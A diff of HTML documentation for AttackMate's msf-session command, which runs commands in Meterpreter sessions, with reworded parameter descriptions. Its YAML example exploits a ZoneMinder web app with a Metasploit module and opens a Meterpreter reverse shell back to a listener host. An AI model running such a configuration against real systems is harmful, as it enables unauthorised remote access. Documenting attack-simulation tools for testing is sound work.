@@ -91,7 +91,16 @@
         </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
               <p class="caption" role="heading"><span class="caption-text">General:</span></p>
 <ul>
-<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html">AttackMate <img alt="Logo" src="/images/AttackMate_logo_no_logo.png" align="right" height="90"></a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html">Requirements</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#installation">Installation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#execute">Execute</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#documentation">Documentation</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#publications">Publications</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#contribution">Contribution</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#disclaimer">Disclaimer</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#security">Security</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#license">License</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../readme_link.html#financial-support">Financial Support</a></li>
 </ul>
 <p class="caption" role="heading"><span class="caption-text">Getting Started:</span></p>
 <ul>
@@ -176,32 +185,61 @@
              
   <section id="msf-session">
 <span id="id1"></span><h1>msf-session<a class="headerlink" href="#msf-session" title="Permalink to this heading"></a></h1>
-<p>This command allows to read and write commands to (Meterpreter)sessions that
-have previously created by msf-modules(see <a class="reference internal" href="msf-module.html#msf-module"><span class="std std-ref">msf-module</span></a>).</p>
+<p>Execute commands in an active Meterpreter session previously opened by an
+<a class="reference internal" href="msf-module.html#msf-module"><span class="std std-ref">msf-module</span></a> command.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>To configure the connection to <code class="docutils literal notranslate"><span class="pre">msfrpcd</span></code>, see <a class="reference internal" href="../../configuration/msf_config.html#msf-config"><span class="std std-ref">msf_config</span></a>.</p>
+</div>
 <div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="nt">commands</span><span class="p">:</span>
+<span class="w">  </span><span class="c1"># First, exploit a vulnerability and create a session:</span>
 <span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">msf-module</span>
-<span class="w">     </span><span class="l l-Scalar l-Scalar-Plain">cmd</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">exploit/unix/webapp/zoneminder_snapshots</span>
-<span class="w">     </span><span class="l l-Scalar l-Scalar-Plain">creates_session</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="s">&quot;foothold&quot;</span>
-<span class="w">     </span><span class="nt">options</span><span class="p">:</span>
-<span class="w">       </span><span class="nt">RHOSTS</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.42.0.254</span>
-<span class="w">     </span><span class="nt">payload_options</span><span class="p">:</span>
-<span class="w">       </span><span class="nt">LHOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.42.2.253</span>
-<span class="w">     </span><span class="nt">payload</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cmd/unix/python/meterpreter/reverse_tcp</span>
+<span class="w">    </span><span class="nt">cmd</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">exploit/unix/webapp/zoneminder_snapshots</span>
+<span class="w">    </span><span class="nt">creates_session</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">foothold</span>
+<span class="w">    </span><span class="nt">options</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">RHOSTS</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.42.0.254</span>
+<span class="w">    </span><span class="nt">payload</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">cmd/unix/python/meterpreter/reverse_tcp</span>
+<span class="w">    </span><span class="nt">payload_options</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">LHOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">192.42.2.253</span>
 
+<span class="w">  </span><span class="c1"># Then, execute a command in the session:</span>
 <span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">msf-session</span>
-<span class="w">    </span><span class="nt">session</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;foothold&quot;</span>
+<span class="w">    </span><span class="nt">session</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">foothold</span>
 <span class="w">    </span><span class="nt">stdapi</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">True</span>
 <span class="w">    </span><span class="nt">cmd</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">getuid</span>
 </pre></div>
 </div>
-<div class="admonition note">
-<p class="admonition-title">Note</p>
-<p>To configure the connection to the msfrpc-server see <a class="reference internal" href="../../configuration/msf_config.html#msf-config"><span class="std std-ref">msf_config</span></a></p>
-</div>
+<dl class="std confval">
+<dt class="sig sig-object std" id="confval-session">
+<span class="sig-name descname"><span class="pre">session</span></span><a class="headerlink" href="#confval-session" title="Permalink to this definition"></a></dt>
+<dd><p>Name of the session to operate in. Must have been created previously by an
+<a class="reference internal" href="msf-module.html#msf-module"><span class="std std-ref">msf-module</span></a> command using <a class="reference internal" href="vnc.html#confval-creates_session"><code class="xref std std-confval docutils literal notranslate"><span class="pre">creates_session</span></code></a>.</p>
+<dl class="field-list simple">
+<dt class="field-odd">Type<span class="colon">:</span></dt>
+<dd class="field-odd"><p>str</p>
+</dd>
+<dt class="field-even">Required<span class="colon">:</span></dt>
+<dd class="field-even"><p>True</p>
+</dd>
+</dl>
+</dd></dl>
+
+<dl class="std confval">
+<dt class="sig sig-object std" id="confval-cmd">
+<span class="sig-name descname"><span class="pre">cmd</span></span><a class="headerlink" href="#confval-cmd" title="Permalink to this definition"></a></dt>
+<dd><p>Command to execute in the session.</p>
+<dl class="field-list simple">
+<dt class="field-odd">Type<span class="colon">:</span></dt>
+<dd class="field-odd"><p>str</p>
+</dd>
+</dl>
+</dd></dl>
+
 <dl class="std confval">
 <dt class="sig sig-object std" id="confval-stdapi">
 <span class="sig-name descname"><span class="pre">stdapi</span></span><a class="headerlink" href="#confval-stdapi" title="Permalink to this definition"></a></dt>
-<dd><p>Load stdapi module in the Meterpreter-session.</p>
+<dd><p>Load the stdapi extension in the Meterpreter session before executing the command.
+Required for many standard Meterpreter commands.</p>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
 <dd class="field-odd"><p>bool</p>
@@ -215,10 +253,10 @@ have previously created by msf-modules(see <a class="reference internal" href="m
 <dl class="std confval">
 <dt class="sig sig-object std" id="confval-write">
 <span class="sig-name descname"><span class="pre">write</span></span><a class="headerlink" href="#confval-write" title="Permalink to this definition"></a></dt>
-<dd><p>Execute a raw write-operation without reading the output.</p>
+<dd><p>Execute a raw write-operation to the session without reading the output.</p>
 <div class="admonition note">
 <p class="admonition-title">Note</p>
-<p>If read and write are both true, the programm will first write and then read.</p>
+<p>If both <code class="docutils literal notranslate"><span class="pre">write</span></code> and <code class="docutils literal notranslate"><span class="pre">read</span></code> are <code class="docutils literal notranslate"><span class="pre">True</span></code>, AttackMate will first write and then read.</p>
 </div>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
@@ -233,7 +271,7 @@ have previously created by msf-modules(see <a class="reference internal" href="m
 <dl class="std confval">
 <dt class="sig sig-object std" id="confval-read">
 <span class="sig-name descname"><span class="pre">read</span></span><a class="headerlink" href="#confval-read" title="Permalink to this definition"></a></dt>
-<dd><p>Execute a raw read-operation without a write-operation.</p>
+<dd><p>Execute a raw read-operation from the session without a preceding write-operation.</p>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
 <dd class="field-odd"><p>bool</p>
@@ -245,23 +283,9 @@ have previously created by msf-modules(see <a class="reference internal" href="m
 </dd></dl>
 
 <dl class="std confval">
-<dt class="sig sig-object std" id="confval-session">
-<span class="sig-name descname"><span class="pre">session</span></span><a class="headerlink" href="#confval-session" title="Permalink to this definition"></a></dt>
-<dd><p>Use this session for all operations.</p>
-<dl class="field-list simple">
-<dt class="field-odd">Type<span class="colon">:</span></dt>
-<dd class="field-odd"><p>str</p>
-</dd>
-<dt class="field-even">Required<span class="colon">:</span></dt>
-<dd class="field-even"><p>True</p>
-</dd>
-</dl>
-</dd></dl>
-
-<dl class="std confval">
 <dt class="sig sig-object std" id="confval-end_str">
 <span class="sig-name descname"><span class="pre">end_str</span></span><a class="headerlink" href="#confval-end_str" title="Permalink to this definition"></a></dt>
-<dd><p>This string indicated the end of a read-operation.</p>
+<dd><p>String indicating the end of a read-operation.</p>
 <dl class="field-list simple">
 <dt class="field-odd">Type<span class="colon">:</span></dt>
 <dd class="field-odd"><p>str</p>
